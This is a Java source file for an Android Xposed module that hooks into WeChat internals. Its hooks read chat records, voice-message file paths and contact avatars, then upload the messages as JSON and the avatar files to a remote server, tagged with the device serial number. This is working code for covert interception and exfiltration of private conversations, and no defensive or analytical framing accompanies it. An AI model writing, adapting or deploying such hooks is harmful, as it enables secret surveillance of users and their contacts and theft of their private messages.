package yktong.com.godofdog.hook;

import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.system.Os;

import com.google.gson.Gson;

import org.greenrobot.eventbus.EventBus;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XSharedPreferences;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;
import space.eileen.tools.UriTools;
import yktong.com.godofdog.bean.EventbusValueBean;
import yktong.com.godofdog.bean.NormalResultBean;
import yktong.com.godofdog.bean.wechat.WxAvatarBean;
import yktong.com.godofdog.bean.xpbean.BeanList;
import yktong.com.godofdog.bean.xpbean.CWecatChatJson;
import yktong.com.godofdog.tool.net.NetTool;
import yktong.com.godofdog.tool.net.OkHttpUtil;
import yktong.com.godofdog.tool.net.OnHttpCallBack;
import yktong.com.godofdog.value.SpValue;
import yktong.com.godofdog.value.Strings;
import yktong.com.godofdog.value.UrlValue;

import static de.robv.android.xposed.XposedHelpers.callMethod;
import static de.robv.android.xposed.XposedHelpers.callStaticMethod;
import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;
import static de.robv.android.xposed.XposedHelpers.findClass;

/**
 * Created by vampire on 2017/8/24.
 */

public class Main implements IXposedHookLoadPackage {
    private Context mContext;
    private Context dxContext;
    private SharedPreferences sharedPreferences;
    private String filePath;

    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
        String packageName = loadPackageParam.packageName;
        if (packageName.contains("yktong.com.godofdog")){
            dongxiaoInfo(loadPackageParam);
        }
        if (!(packageName.contains("com.tencent") && packageName.contains("mm")))
            return;

        Object activityThread = callStaticMethod(findClass("android.app.ActivityThread", null), "currentActivityThread");
        mContext = (Context) callMethod(activityThread, "getSystemContext");
        String versionName = mContext.getPackageManager().getPackageInfo(packageName, 0).versionName;
        XposedBridge.log("Loaded app: " + "微信" + " " + versionName);
        //PC回复
//        replyByPC(loadPackageParam, versionName);
//        PackageHooker packageHooker = new PackageHooker(loadPackageParam);
//        packageHooker.hook();
        hookContent(loadPackageParam);
    }

    private void dongxiaoInfo(XC_LoadPackage.LoadPackageParam loadPackageParam) {
        try {
            findAndHookMethod("yktong.com.godofdog.base.MyApp", loadPackageParam.classLoader, "getmContext", new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    super.afterHookedMethod(param);
                    dxContext = (Context) param.getResult();
                }
            });
        }catch (NoClassDefFoundError e){
            e.printStackTrace();
        }
    }

    private void hookContent(XC_LoadPackage.LoadPackageParam param) {
        Class<?> aClass = findClass("com.tencent.mm.network.p", param.classLoader);
        findAndHookMethod("com.tencent.mm.modelmulti.d", param.classLoader, "a", int.class, int.class, int.class, String.class, aClass, byte[].class, new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                super.beforeHookedMethod(param);
                Object[] args = param.args;
                for (int i = 0; i < args.length; i++) {
                    XposedBridge.log("param :" + i + " -------" +args[i].toString());
                }
            }
        });

        /**
         * 获取头像
         */
        findAndHookMethod("com.tencent.mm.v.d", param.classLoader, "u", String.class, boolean.class, new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                super.afterHookedMethod(param);
                String result = (String) param.getResult();
                String username = (String) param.args[0];
                String string = param.args[1].toString();
                XposedBridge.log("头像 : " + result);
                XposedBridge.log("username : " +username);
                SettingsHelper mSettings = new SettingsHelper("yktong.com.godofdog");
                String filePath = mSettings.getString(SpValue.USER_AVATAR + username, "");
                XposedBridge.log(filePath);
                if (filePath.equals(result)){
                    return ;
                }
                if (filePath.isEmpty()||!filePath.equals(result)){
                    HashMap<String, Object> params = new HashMap<String, Object>();
                    File file = new File(result);
                    params.put("file", file);
                    NetTool.getInstance().upLoadFile(UrlValue.ADD_USER_PHOTO + android.os.Build.SERIAL + "&cwcuUsername=" + username, params, NormalResultBean.class, new OkHttpUtil.ReqProgressCallBack<NormalResultBean>() {
                        @Override
                        public void onProgress(long total, long current) {

                        }

                        @Override
                        public void onSuccess(NormalResultBean response) {
                            XposedBridge.log(response.getCode());
                            if (response.getCode().equals("1")){
                                EventBus.getDefault().post(new WxAvatarBean(SpValue.USER_AVATAR+username,result));
                            }
                            XposedBridge.log(response.getCode());
                        }

                        @Override
                        public void onFailed(String msg) {

                        }
                    });
                }
                XposedBridge.log(string);
            }
        });
        /**
         * 获取语音文件路径
         */
        findAndHookMethod("com.tencent.mm.modelvoice.q", param.classLoader, "H", String.class, boolean.class, new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                super.afterHookedMethod(param);
                String  s  = (String) param.args[0];
                String fileName = "msg_"+s+".amr";
                XposedBridge.log("after: " + fileName);
                filePath = (String) param.getResult();
                XposedBridge.log("filePath : " + filePath);

            }
        });

        /**
         * 获取聊天记录
         */
        findAndHookMethod("com.tencent.mm.e.b.ah", param.classLoader, "po", new XC_MethodHook() {

            private File voiceFile;

            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                super.afterHookedMethod(param);
                ContentValues contentValues = (ContentValues) param.getResult();
                XposedBridge.log("com.tencent.mm.e.b.ah :   "+contentValues.toString());
                CWecatChatJson cWecatChatJson = XpUtil.transformConten(contentValues,mContext);
                XposedBridge.log(cWecatChatJson.getDigestUser()+"------");
                if (cWecatChatJson.getMsgType()==34){
                    voiceFile = new File(filePath);
                }
                ArrayList<CWecatChatJson> cWecatChatJsons = new ArrayList<CWecatChatJson>();
                cWecatChatJsons.add(cWecatChatJson);
                BeanList beanList = new BeanList(cWecatChatJsons);
                if (cWecatChatJson.getStatus()==2 || cWecatChatJson.getStatus()==3){
                    Gson gson = new Gson();
                    String json = gson.toJson(beanList);
                    XposedBridge.log(json);
                    XposedBridge.log(UrlValue.ADD_CHAT_DATE + android.os.Build.SERIAL);
                    Map<String, String> paramsMap = new HashMap<String, String>();
                    paramsMap.put("cWecatChatJson",json);
                    if (cWecatChatJson.getMsgType()==34){
                        {
                            Intent intent = new Intent();
                            intent.setAction("yktong.com.godofdog.hook.voiceMsg");
                            intent.putExtra("filePath",voiceFile.getPath());
                            intent.putExtra("json",json);
                            mContext.sendBroadcast(intent);
                        }
                        Map<String, List<File>> paramFilesMap = new HashMap<String, List<File>>();
                        List<File> files = new ArrayList<File>();
                        files.add(voiceFile);
                        paramFilesMap.put("file",files);
                    }else {
                        NetTool.getInstance().upLoadJson(UrlValue.ADD_CHAT_DATE + android.os.Build.SERIAL, paramsMap, NormalResultBean.class, new OnHttpCallBack<NormalResultBean>() {
                            @Override
                            public void onSuccess(NormalResultBean response) {
                                XposedBridge.log("Success -- ");
                                XposedBridge.log("code : "+response.getCode());
                            }

                            @Override
                            public void onError(Throwable e) {
                                XposedBridge.log(e.toString());
                            }
                        });
                    }


                }
            }
        });


    }
}
